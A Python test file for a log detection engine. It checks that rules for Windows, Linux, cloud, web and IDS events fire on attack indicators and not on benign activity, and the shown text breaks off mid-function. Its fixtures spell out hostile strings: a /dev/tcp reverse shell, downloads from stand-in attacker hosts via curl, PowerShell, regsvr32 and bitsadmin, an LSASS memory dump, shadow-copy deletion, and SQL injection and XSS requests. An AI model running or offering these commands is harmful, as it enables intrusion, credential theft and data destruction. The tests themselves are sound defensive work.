    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-win-failed-logon" in hits(vendor="microsoft", log_type="security",
                                         action="failed-logon")
    rdp = hits(vendor="paloalto", dst_port=3389, action="allow")
    assert "lo-rdp-allowed" in rdp
    assert "lo-rdp-allowed" not in hits(vendor="paloalto", dst_port=3389, action="deny")
    assert "lo-ingress-tool-transfer" in hits(
        vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")
    assert "lo-clear-eventlog" in hits(vendor="microsoft", raw={"EventID": 1102})


def test_rule_pack_loads_and_is_well_formed():
    rules = load_rules(RULES_DIR)
    by_id = {r.id for r in rules}
    expected = {"lo-aws-logging-disabled", "lo-aws-root-console-login",
                "lo-aws-sg-open-world", "lo-aws-access-key-created",
                "lo-entra-risky-signin", "lo-entra-legacy-auth",
                "lo-okta-admin-grant", "lo-okta-mfa-deactivated",
                "lo-m365-inbox-forwarding", "lo-github-repo-public",
                "lo-powershell-encoded", "lo-external-rdp-inbound"}
    assert expected <= by_id
    # every shipped detection rule has a level, a condition and parsed MITRE tags
    for r in rules:
        assert r.level in ("low", "medium", "high", "critical", "informational")
        assert r.detection.get("condition")
        assert r.techniques, f"{r.id} has no technique tag"


def test_engine_fires_cloud_and_identity_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-aws-logging-disabled" in hits(
        vendor="aws", product="cloudtrail", rule_name="StopLogging")
    assert "lo-aws-root-console-login" in hits(
        vendor="aws", product="cloudtrail", rule_name="ConsoleLogin",
        raw={"userIdentity": {"type": "Root"}})
    assert "lo-entra-risky-signin" in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="high")
    assert "lo-entra-risky-signin" not in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="low")
    assert "lo-m365-inbox-forwarding" in hits(
        vendor="microsoft", product="o365", action="New-InboxRule",
        message="Created rule with ForwardTo attacker@evil.test")
    assert "lo-okta-mfa-deactivated" in hits(
        vendor="okta", log_type="user.mfa.factor.deactivate")


def test_engine_fires_modifier_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    # cidr: public source fires, RFC1918 source does not
    assert "lo-external-rdp-inbound" in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="203.0.113.7")
    assert "lo-external-rdp-inbound" not in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="10.20.30.40")
    # windash: the /enc form of an encoded PowerShell command
    assert "lo-powershell-encoded" in hits(
        vendor="x", message="powershell.exe /enc SQBFAFgA")


def test_engine_fires_tripwire_fim_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def tw(resource=None, message=None, action=None, vendor="tripwire"):
        return dict(vendor=vendor, product="tripwire enterprise", log_type="fileintegrity",
                    action=action, message=message,
                    raw={"attributes": {"resource": resource} if resource else {}})

    # each FIM rule fires on its indicator (resource carried in raw.attributes)
    assert "lo-tripwire-critical-file-change" in hits(
        **tw(resource="/etc/shadow", message="Monitored file changed: /etc/shadow"))
    assert "lo-tripwire-web-shell" in hits(
        **tw(resource="/var/www/html/cmd.php", action="added"))
    assert "lo-tripwire-persistence-change" in hits(
        **tw(resource="/etc/cron.d/backdoor", action="added"))
    assert "lo-tripwire-monitoring-disabled" in hits(
        **tw(message="Real-time monitoring stopped for node FIN-WS-014", action="disabled"))
    assert "lo-tripwire-object-removed" in hits(
        **tw(resource="/var/log/audit/audit.log", message="object removed", action="removed"))

    # negatives: a benign monitored change fires nothing, and the vendor gate
    # keeps a non-Tripwire event with the same path from tripping these rules.
    assert not {i for i in hits(**tw(resource="/tmp/app.log", action="modified"))
                if "tripwire" in i}
    assert not {i for i in hits(vendor="cisco", message="changed /etc/shadow",
                                raw={"attributes": {"resource": "/etc/shadow"}})
                if "tripwire" in i}


def test_existing_rules_fire_on_endpoint_telemetry():
    """The new Sysmon / auditd parsers feed CommandLine into the fields existing
    command-line rules already match — so endpoint telemetry lights them up."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-powershell-encoded" in hits(          # Sysmon EID 1 process create
        vendor="microsoft", product="sysmon", log_type="process-create",
        action="process-create", message="powershell.exe -enc SQBFAFgA")
    assert "lo-ingress-tool-transfer" in hits(       # Linux auditd EXECVE
        vendor="linux", product="auditd", log_type="execve", action="process-create",
        message="curl -O http://malware-c2.example.net/x.sh")


def test_engine_fires_sysmon_endpoint_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    assert "lo-sysmon-office-spawns-shell" in hits(
        **sm(ParentImage=r"C:\Office\winword.exe", Image=r"C:\Windows\System32\cmd.exe"))
    assert "lo-sysmon-lolbin-proxy-exec" in hits(
        **sm(Image=r"C:\Windows\System32\regsvr32.exe",
             CommandLine="regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"))
    assert "lo-sysmon-registry-runkey-persistence" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil"))
    assert "lo-sysmon-lsass-dump" in hits(
        **sm(Image=r"C:\Windows\System32\rundll32.exe",
             CommandLine=r"rundll32 comsvcs.dll MiniDump 640 C:\lsass.dmp full"))
    assert "lo-inhibit-recovery-shadowcopy" in hits(
        **sm(CommandLine="vssadmin delete shadows /all /quiet"))
    assert "lo-schtasks-persistence" in hits(
        **sm(CommandLine="schtasks /create /tn U /tr calc /sc onlogon"))
    assert "lo-sysmon-wmi-persistence" in hits(**sm("wmi-consumer"))
    assert "lo-clear-eventlog-cmdline" in hits(
        **sm(Image=r"C:\Windows\System32\wevtutil.exe", CommandLine="wevtutil cl Security"))
    # a benign process create trips none of the endpoint rules
    benign = hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
                       ParentImage=r"C:\Windows\explorer.exe", CommandLine="notepad readme.txt"))
    assert not {i for i in benign
                if i.startswith(("lo-sysmon", "lo-inhibit", "lo-schtasks", "lo-clear-eventlog-cmd"))}


def test_engine_fires_nutanix_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def api(action=None, endpoint=None):
        return dict(vendor="nutanix", product="prism-central", log_type="api_audit",
                    action=action, rule_name=endpoint,
                    raw={"restEndpoint": endpoint, "httpMethod": action})

    def audit(message=None, action=None):
        return dict(vendor="nutanix", product="prism-central", log_type="audit",
                    action=action, message=message)

    # api DELETE on a specific VM fires; a benign GET / a DELETE on /vms/list do not.
    assert "lo-nutanix-vm-destruction" in hits(
        **api(action="DELETE", endpoint="/api/nutanix/v3/vms/5f3c9d2a-1b2c"))
    assert "lo-nutanix-vm-destruction" not in hits(
        **api(action="GET", endpoint="/api/nutanix/v3/vms/list"))
    assert "lo-nutanix-vm-destruction" not in hits(
        **api(action="DELETE", endpoint="/api/nutanix/v3/vms/list"))

    # consolidated-audit indicators
    assert "lo-nutanix-cluster-unregister" in hits(
        **audit(message="Unregistered cluster Prod-PE-01 from Prism Central", action="Delete"))
    assert "lo-nutanix-privilege-change" in hits(
        **audit(message="Updated role mapping for user contractor01 to Cluster Admin"))

    # a benign VM-list read from a non-nutanix source trips none of these rules
    assert not {i for i in hits(vendor="okta", message="role mapping updated")
                if i.startswith("lo-nutanix")}


def test_load_nutanix_flow_drop_correlation_rule():
    from app.detection.correlation import load_correlation_rules
    by_id = {r.id: r for r in load_correlation_rules(RULES_DIR)}
    fd = by_id["lo-corr-nutanix-flow-drop-burst"]
    assert fd.match["vendor"] == "nutanix" and fd.match["action"] == "drop"
    assert fd.group_by == ["src_ip"]
    assert fd.window == 300 and fd.threshold == 20
    assert "T1046" in fd.techniques


def test_engine_fires_nutanix_files_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def fa(action=None, path=None, message=None):
        return dict(vendor="nutanix", product="files", log_type="file-audit",
                    action=action, rule_name=path, message=message)

    # a rename to a ransomware extension fires; a normal .xlsx write does not
    assert "lo-nutanix-files-ransomware-ext" in hits(
        **fa(action="rename", path="/Finance/q2.xlsx.locked",
             message="CORP\\attacker renamed /Finance/q2.xlsx -> /Finance/q2.xlsx.locked"))
    assert "lo-nutanix-files-ransomware-ext" in hits(
        **fa(action="create", path="/share/HOW_TO_DECRYPT.txt"))
    assert "lo-nutanix-files-ransomware-ext" not in hits(
        **fa(action="write", path="/Finance/q2.xlsx"))
    # a read of an already-encrypted file is not the encryption act -> no fire
    assert "lo-nutanix-files-ransomware-ext" not in hits(
        **fa(action="read", path="/Finance/q2.xlsx.locked"))

    assert "lo-nutanix-files-permission-change" in hits(**fa(action="security-change",
                                                             path="/Finance/payroll"))
    # benign ops trip nothing
    assert not {i for i in hits(**fa(action="read", path="/HR/handbook.pdf"))
                if i.startswith("lo-nutanix-files")}


def test_load_nutanix_files_mass_delete_correlation_rule():
    from app.detection.correlation import load_correlation_rules
    by_id = {r.id: r for r in load_correlation_rules(RULES_DIR)}
    md = by_id["lo-corr-nutanix-files-mass-delete"]
    assert md.match["vendor"] == "nutanix" and md.match["product"] == "files"
    assert "delete" in md.match["action"]
    assert md.group_by == ["user_name"]
    assert md.window == 600 and md.threshold == 50
    assert "T1486" in md.techniques


def test_alert_from_match_builds_row():
    rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
    evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
                          action="failed-logon", user_name="CORP\\jdoe",
                          src_ip="45.83.122.7", message="x" * 5000)
    a = alert_from_match(rule, evt, dedup_hash="abc123", batch_id=7)
    assert a["rule_id"] == "lo-win-failed-logon" and a["level"] == "low"
    assert "T1110" in a["techniques"] and "credential access" in a["tactics"]
    assert a["src_ip"] == "45.83.122.7" and a["user_name"] == "CORP\\jdoe"
    assert a["dedup_hash"] == "abc123" and a["batch_id"] == 7
    assert len(a["message"]) == 1000          # truncated for storage


# ── Phase 2: Windows / Sysmon high-fidelity endpoint pack ────────────────────
def test_engine_fires_phase2_endpoint_rules():
    """Each Phase 2 rule fires on its positive indicator (fields carried in raw,
    as the Sysmon / Windows-Security parsers surface them)."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    # 1 LSASS memory access (EID10) — sensitive mask, non-benign source
    assert "lo-sysmon-lsass-memory-access" in hits(
        **sm("process-access", TargetImage=r"C:\Windows\System32\lsass.exe",
             GrantedAccess="0x1410", SourceImage=r"C:\Temp\evil.exe"))
    # 2 credential-dumper tool — by image, by original filename, by argument
    assert "lo-sysmon-credential-dumper-tools" in hits(**sm(Image=r"C:\Temp\m.exe",
                                                            OriginalFileName="mimikatz.exe"))
    assert "lo-sysmon-credential-dumper-tools" in hits(
        **sm(Image=r"C:\a\b.exe", CommandLine="b.exe sekurlsa::logonpasswords"))
    # 3 NTDS / SAM extraction
    assert "lo-sysmon-ntds-sam-extraction" in hits(
        **sm(CommandLine=r'ntdsutil "ac i ntds" "create full C:\temp" q q'))
    assert "lo-sysmon-ntds-sam-extraction" in hits(
        **sm(CommandLine=r"reg save hklm\sam C:\temp\sam.hive"))
    # 4 remote thread into a sensitive process (EID8)
    assert "lo-sysmon-remote-thread-injection" in hits(
        **sm("create-remote-thread", TargetImage=r"C:\Windows\System32\lsass.exe",
             SourceImage=r"C:\Users\p\AppData\Local\Temp\x.exe"))
    # 5 BYOVD vulnerable driver load (EID6)
    assert "lo-sysmon-byovd-driver-load" in hits(
        **sm("driver-load", ImageLoaded=r"C:\Windows\Temp\RTCore64.sys"))
    # 6 UAC bypass registry hijack (EID13)
    assert "lo-sysmon-uac-bypass-registry" in hits(
        **sm("registry-set",
             TargetObject=r"HKU\S-1-5-21\Software\Classes\ms-settings\Shell\Open\command\(Default)"))
    # 7 LSA / AppInit / Winlogon-Notify persistence
    assert "lo-sysmon-lsa-appinit-persistence" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"))
    # 8 WDigest UseLogonCredential enabled
    assert "lo-sysmon-wdigest-uselogoncredential" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
             Details="DWORD (0x00000001)"))
    # 9 Defender disabled (registry and PowerShell paths)
    assert "lo-sysmon-defender-disable" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring"))
    assert "lo-sysmon-defender-disable" in hits(
        **sm(CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true"))
    # 10 AMSI / ETW tampering
    assert "lo-sysmon-amsi-etw-tamper" in hits(
        **sm(CommandLine="powershell [Ref].Assembly.GetType('...AmsiUtils') AmsiScanBuffer patch"))
    # 11 PsExec / remote service exec
    assert "lo-sysmon-psexec-service-exec" in hits(**sm(Image=r"C:\Windows\PSEXESVC.exe"))
    assert "lo-sysmon-psexec-service-exec" in hits(
        **sm(CommandLine=r"psexec \\FIN-DC01 -accepteula -s cmd.exe"))
    # 12 msiexec installing a remote package
    assert "lo-sysmon-msiexec-remote-package" in hits(
        **sm(Image=r"C:\Windows\System32\msiexec.exe",
             CommandLine="msiexec /i https://evil.example/x.msi /quiet"))
    # 13 BITS transfer
    assert "lo-sysmon-bits-transfer" in hits(
        **sm(CommandLine="bitsadmin /transfer job http://evil.example/a.exe C:\\a.exe"))
    # 14 Cobalt Strike default named pipe (EID17)
    assert "lo-sysmon-c2-named-pipe" in hits(**sm("pipe-create", PipeName=r"\msagent_a1"))
    # 15 local account created (Windows Security 4720)
    assert "lo-win-local-account-created" in hits(
        vendor="microsoft", log_type="security", action="user-created")


def test_phase2_benign_endpoint_activity_stays_quiet():
    """Benign endpoint activity that superficially resembles the indicators must
    NOT trip the Phase 2 rules (false-positive guards)."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    def phase2(ids):
        return {i for i in ids if i in {
            "lo-sysmon-lsass-memory-access", "lo-sysmon-credential-dumper-tools",
            "lo-sysmon-ntds-sam-extraction", "lo-sysmon-remote-thread-injection",
            "lo-sysmon-byovd-driver-load", "lo-sysmon-uac-bypass-registry",
            "lo-sysmon-lsa-appinit-persistence", "lo-sysmon-wdigest-uselogoncredential",
            "lo-sysmon-defender-disable", "lo-sysmon-amsi-etw-tamper",
            "lo-sysmon-psexec-service-exec", "lo-sysmon-msiexec-remote-package",
            "lo-sysmon-bits-transfer", "lo-sysmon-c2-named-pipe",
            "lo-win-local-account-created"}}

    # Defender itself reading LSASS is on the benign-source exclusion list
    assert not phase2(hits(**sm("process-access",
                                TargetImage=r"C:\Windows\System32\lsass.exe",
                                GrantedAccess="0x1410",
                                SourceImage=r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe")))
    # local msiexec install (no remote source) does not fire the remote-package rule
    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\msiexec.exe",
                                CommandLine=r"msiexec /i C:\pkgs\app.msi /quiet")))
    # a legitimate GPU driver load is not a BYOVD hit
    assert not phase2(hits(**sm("driver-load", ImageLoaded=r"C:\Windows\System32\drivers\nvlddmkm.sys")))
    # Chrome's mojo IPC pipe is not a Cobalt Strike pipe
    assert not phase2(hits(**sm("pipe-create", PipeName=r"\mojo.7890.12345.9876543210")))
    # reading (not saving) a hive is not extraction
    assert not phase2(hits(**sm(CommandLine=r"reg query hklm\sam")))
    # WDigest key set back to 0 is not the credential-caching enable
    assert not phase2(hits(**sm("registry-set",
                                TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
                                Details="DWORD (0x00000000)")))
    # a plain interactive logon is not account creation
    assert not phase2(hits(vendor="microsoft", log_type="security", action="logon"))
    # an everyday process create trips none of the pack
    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
                                ParentImage=r"C:\Windows\explorer.exe",
                                CommandLine="notepad C:\\Users\\p\\notes.txt")))


def test_sysmon_parser_surfaces_eid_fields_for_phase2_rules():
    """End-to-end: a rendered-Message Get-WinEvent JSON export (the shape analysts
    actually produce) flows through the Sysmon parser and lights up the EID 10 / 6
    rules — proving the lifted SourceImage/TargetImage/GrantedAccess/ImageLoaded
    fields resolve, not only synthetic EventData."""
    import json

    from app.parsers.sysmon import parse as sysmon_parse

    eng = DetectionEngine(load_rules(RULES_DIR))

    def fired(content):
        ids = set()
        for evt in sysmon_parse(content):
            ids |= {r.id for r in eng.evaluate_event(evt)}
        return ids

    eid10 = json.dumps({
        "Id": 10, "MachineName": "FIN-WS-014",
        "Message": "Process accessed:\r\nUtcTime: 2026-01-02 10:11:12.345\r\n"
                   "SourceImage: C:\\Users\\p\\AppData\\Local\\Temp\\evil.exe\r\n"
                   "SourceProcessId: 4242\r\n"
                   "TargetImage: C:\\Windows\\System32\\lsass.exe\r\n"
                   "GrantedAccess: 0x1410\r\n"
                   "CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c534|UNKNOWN(...)\r\n"})
    assert "lo-sysmon-lsass-memory-access" in fired(eid10)

    eid6 = json.dumps({
        "Id": 6, "MachineName": "FIN-WS-014",
        "Message": "Driver loaded:\r\nUtcTime: 2026-01-02 10:15:00.000\r\n"
                   "ImageLoaded: C:\\Windows\\Temp\\RTCore64.sys\r\n"
                   "Signed: true\r\nSignature: MICRO-STAR INTERNATIONAL\r\n"
                   "SignatureStatus: Valid\r\n"})
    assert "lo-sysmon-byovd-driver-load" in fired(eid6)


# ── Phase 3: Cloud + Identity high-value pack ────────────────────────────────
_PHASE3_IDS = {
    "lo-aws-guardduty-disabled", "lo-aws-iam-admin-policy-attached",
    "lo-aws-s3-public-access", "lo-gcp-iam-privileged-grant", "lo-gcp-sa-key-created",
    "lo-gcp-logging-sink-deleted", "lo-azure-rbac-role-assignment",
    "lo-azure-diagnostic-settings-deleted", "lo-azure-keyvault-tamper",
    "lo-gitlab-2fa-disabled", "lo-gitlab-project-made-public",
    "lo-okta-admin-impersonation", "lo-m365-transport-rule",
    "lo-m365-mailbox-delegate", "lo-github-2fa-disabled",
    "lo-github-branch-protection-removed",
}


def test_engine_fires_phase3_cloud_identity_rules():
    """Each Phase 3 cloud/identity rule fires on its positive indicator, built as
    the AWS / GCP / Azure / GitLab / Okta / M365 / GitHub parsers surface it."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def aws(rule_name=None, action="success", raw=None):
        return dict(vendor="aws", product="cloudtrail", rule_name=rule_name,
                    action=action, raw=raw or {})

    def gcp(action=None, raw=None):
        return dict(vendor="gcp", product="cloud-audit", action=action, raw=raw or {})

    def azure(action=None):
        return dict(vendor="microsoft", product="azure", action=action, raw={})

    # AWS ----------------------------------------------------------------------
    assert "lo-aws-guardduty-disabled" in hits(**aws(rule_name="DeleteDetector"))
    assert "lo-aws-iam-admin-policy-attached" in hits(**aws(
        rule_name="AttachUserPolicy",
        raw={"requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}}))
    assert "lo-aws-s3-public-access" in hits(**aws(
        rule_name="PutBucketAcl",
        raw={"requestParameters": {"AccessControlPolicy": {"grantee":
             "http://acs.amazonaws.com/groups/global/AllUsers"}}}))
    assert "lo-aws-s3-public-access" in hits(**aws(rule_name="DeletePublicAccessBlock"))
    # GCP ----------------------------------------------------------------------
    assert "lo-gcp-iam-privileged-grant" in hits(**gcp(
        action="google.cloud.resourcemanager.v3.Projects.SetIamPolicy",
        raw={"protoPayload": {"request": {"policy": {"bindings":
             [{"role": "roles/owner", "members": ["user:evil@corp.test"]}]}}}}))
    assert "lo-gcp-sa-key-created" in hits(**gcp(
        action="google.iam.admin.v1.CreateServiceAccountKey"))
    assert "lo-gcp-logging-sink-deleted" in hits(**gcp(
        action="google.logging.v2.ConfigServiceV2.DeleteSink"))
    # Azure --------------------------------------------------------------------
    assert "lo-azure-rbac-role-assignment" in hits(**azure(
        action="Microsoft.Authorization/roleAssignments/write"))
    assert "lo-azure-diagnostic-settings-deleted" in hits(**azure(
        action="microsoft.insights/diagnosticSettings/delete"))
    assert "lo-azure-keyvault-tamper" in hits(**azure(
        action="Microsoft.KeyVault/vaults/delete"))
    # GitLab (real audit shape: underscore event_name / discrete details fields)
    assert "lo-gitlab-2fa-disabled" in hits(
        vendor="gitlab", product="audit", action="user_disable_two_factor",
        message="user_disable_two_factor", raw={"event_name": "user_disable_two_factor"})
    assert "lo-gitlab-project-made-public" in hits(
        vendor="gitlab", product="audit", action="change visibility",
        message="change visibility",
        raw={"details": {"change": "visibility", "from": "Private", "to": "Public"}})
    # Okta ---------------------------------------------------------------------
    assert "lo-okta-admin-impersonation" in hits(
        vendor="okta", product="system-log", log_type="user.session.impersonation.grant")
    # M365 ---------------------------------------------------------------------
    assert "lo-m365-transport-rule" in hits(
        vendor="microsoft", product="o365", action="New-TransportRule")
    assert "lo-m365-mailbox-delegate" in hits(
        vendor="microsoft", product="o365", action="Add-MailboxPermission")
    # GitHub -------------------------------------------------------------------
    assert "lo-github-2fa-disabled" in hits(
        vendor="github", product="audit", action="org.disable_two_factor_requirement")
    assert "lo-github-branch-protection-removed" in hits(
        vendor="github", product="audit", action="protected_branch.destroy")


def test_phase3_benign_cloud_activity_stays_quiet():
    """Benign / opposite-direction cloud activity must not trip the Phase 3 rules."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def p3(ids):
        return {i for i in ids if i in _PHASE3_IDS}

    # non-admin IAM policy attach is not the admin-policy rule
    assert not p3(hits(vendor="aws", product="cloudtrail", rule_name="AttachUserPolicy",
                       action="success",
                       raw={"requestParameters": {"policyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"}}))
    # a private S3 ACL put is not public exposure
    assert not p3(hits(vendor="aws", product="cloudtrail", rule_name="PutBucketAcl",
                       action="success",
                       raw={"requestParameters": {"AccessControlPolicy": {"grantee": "CanonicalUser:owner"}}}))
    # GCP SetIamPolicy granting only a viewer role is not a privileged grant
    assert not p3(hits(vendor="gcp", product="cloud-audit",
                       action="google.cloud.resourcemanager.v3.Projects.SetIamPolicy",
                       raw={"protoPayload": {"request": {"policy": {"bindings":
                            [{"role": "roles/viewer", "members": ["user:dev@corp.test"]}]}}}}))
    # creating (not deleting) a log sink is fine
    assert not p3(hits(vendor="gcp", product="cloud-audit",
                       action="google.logging.v2.ConfigServiceV2.CreateSink"))
    # writing (not deleting) a diagnostic setting is fine
    assert not p3(hits(vendor="microsoft", product="azure",
                       action="microsoft.insights/diagnosticSettings/write"))
    # ENABLING 2FA / making a repo private are the opposite of the alerts
    assert not p3(hits(vendor="gitlab", product="audit", action="user_enable_two_factor",
                       message="user_enable_two_factor",
                       raw={"event_name": "user_enable_two_factor"}))
    assert not p3(hits(vendor="gitlab", product="audit", action="change visibility",
                       message="change visibility",
                       raw={"details": {"change": "visibility", "from": "Public", "to": "Private"}}))
    assert not p3(hits(vendor="github", product="audit",
                       action="org.enable_two_factor_requirement"))
    # a normal Okta session start / a mailbox read are not impersonation / delegation
    assert not p3(hits(vendor="okta", product="system-log", log_type="user.session.start"))
    assert not p3(hits(vendor="microsoft", product="o365", action="Get-MailboxPermission"))


# ── Phase 4: Linux + Network (web-exploitation T1190, Suricata IDS, auditd) ───
_PHASE4_IDS = {
    "lo-web-sql-injection", "lo-web-path-traversal", "lo-web-command-injection",
    "lo-web-xss", "lo-web-scanner-ua", "lo-web-webshell-access",
    "lo-suricata-web-attack", "lo-suricata-trojan-c2", "lo-suricata-crypto-mining",
    "lo-linux-reverse-shell",
    "lo-linux-setuid-backdoor", "lo-linux-sudoers-tamper", "lo-linux-ssh-authorized-keys",
    "lo-linux-shadow-access", "lo-linux-cron-persistence", "lo-linux-disable-security",
}


def test_engine_fires_phase4_network_web_rules():
    """Each Phase 4 web-exploitation / IDS / Linux rule fires on its positive."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def web(req, **extra):
        return dict(vendor="web", product="access", log_type="access", action="GET",
                    message=req, raw={"request": req, **extra})

    def lx(cmd):  # auditd EXECVE
        return dict(vendor="linux", product="auditd", log_type="execve",
                    action="process-create", message=cmd, raw={"type": "EXECVE"})

    # Web exploitation (T1190 & co.) --------------------------------------------
    assert "lo-web-sql-injection" in hits(**web(
        "GET /item?id=1 UNION SELECT username,password FROM users HTTP/1.1"))
    assert "lo-web-path-traversal" in hits(**web(
        "GET /download?f=../../../../etc/passwd HTTP/1.1"))
    assert "lo-web-command-injection" in hits(**web(
        "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1"))
    assert "lo-web-xss" in hits(**web(
        "GET /search?q=<script>document.cookie</script> HTTP/1.1"))
    assert "lo-web-webshell-access" in hits(**web("GET /uploads/shell.php?cmd=id HTTP/1.1"))
    # scanner fingerprint lives in the user-agent (raw)
    assert "lo-web-scanner-ua" in hits(vendor="web", product="access", log_type="access",
                                       action="GET", message="GET /login HTTP/1.1",
                                       raw={"user_agent": "sqlmap/1.7.2#stable"})
    # cross-source: same SQLi fires on a Zeek http event (log_type=http)
    assert "lo-web-sql-injection" in hits(
        vendor="zeek", product="http", log_type="http", action="200",
        message="HTTP GET evil.test/item?id=1 union select null,null-- -",
        raw={"uri": "/item?id=1 union select null,null-- -"})

    # Suricata IDS passthrough --------------------------------------------------
    assert "lo-suricata-web-attack" in hits(
        vendor="suricata", product="eve", log_type="alert", severity="high",
        raw={"alert": {"category": "Web Application Attack", "signature": "ET WEB_SPECIFIC ..."}})
    assert "lo-suricata-trojan-c2" in hits(
        vendor="suricata", product="eve", log_type="alert", severity="high",
        raw={"alert": {"category": "A Network Trojan was Detected", "signature": "ET MALWARE ..."}})
    assert "lo-suricata-crypto-mining" in hits(
        vendor="suricata", product="eve", log_type="alert", severity="low",
        raw={"alert": {"category": "Crypto Currency Mining Activity", "signature": "ET POLICY ..."}})

    # Linux auditd --------------------------------------------------------------
    assert "lo-linux-reverse-shell" in hits(**lx("bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"))
    assert "lo-linux-setuid-backdoor" in hits(**lx("chmod 4755 /tmp/rootbash"))
    assert "lo-linux-sudoers-tamper" in hits(**lx("tee /etc/sudoers.d/backdoor"))
    assert "lo-linux-ssh-authorized-keys" in hits(**lx("tee -a /home/svc/.ssh/authorized_keys"))
    assert "lo-linux-shadow-access" in hits(**lx("cat /etc/shadow"))
    assert "lo-linux-cron-persistence" in hits(**lx("cp /tmp/evil /etc/cron.d/backup"))
    assert "lo-linux-disable-security" in hits(**lx("setenforce 0"))


def test_phase4_benign_network_web_activity_stays_quiet():
    """Benign web requests and Linux commands must not trip the Phase 4 rules."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def p4(ids):
        return {i for i in ids if i in _PHASE4_IDS}

    def web(req, **extra):
        return dict(vendor="web", product="access", log_type="access", action="GET",
                    message=req, raw={"request": req, **extra})

    def lx(cmd):
        return dict(vendor="linux", product="auditd", log_type="execve",
                    action="process-create", message=cmd, raw={"type": "EXECVE"})

    # ordinary web traffic trips nothing
    assert not p4(hits(**web("GET /products?category=shoes&id=42 HTTP/1.1",
                             user_agent="Mozilla/5.0 (Windows NT 10.0) Chrome/120")))
    assert not p4(hits(**web("POST /api/v1/cart/add HTTP/1.1",
                             user_agent="okhttp/4.9")))
    # a benign Suricata alert category and a non-alert event are quiet
    assert not p4(hits(vendor="suricata", product="eve", log_type="alert", severity="low",
                       raw={"alert": {"category": "Not Suspicious Traffic"}}))
    assert not p4(hits(vendor="suricata", product="eve", log_type="dns",
                       raw={"dns": {"rrname": "example.com"}}))
    # ordinary Linux commands trip nothing
    assert not p4(hits(**lx("chmod 755 /var/www/index.html")))
    assert not p4(hits(**lx("cat /etc/passwd")))
    assert not p4(hits(**lx("ls -la /etc/cron.d")))
    assert not p4(hits(**lx("bash -c 'systemctl status nginx'")))


# ── Phase 5: cardinality / distinct-count correlation ────────────────────────
def test_cardinality_correlation_rules_load_and_build_alerts():
    """The distinct-count correlation rules parse their distinct_field and the
    alert message names the counted dimension (behavioural upgrade, Phase 5)."""
    from app.detection.correlation import correlation_alert, load_correlation_rules

    rules = {r.id: r for r in load_correlation_rules(RULES_DIR)}

    spray = rules["lo-corr-password-spray"]
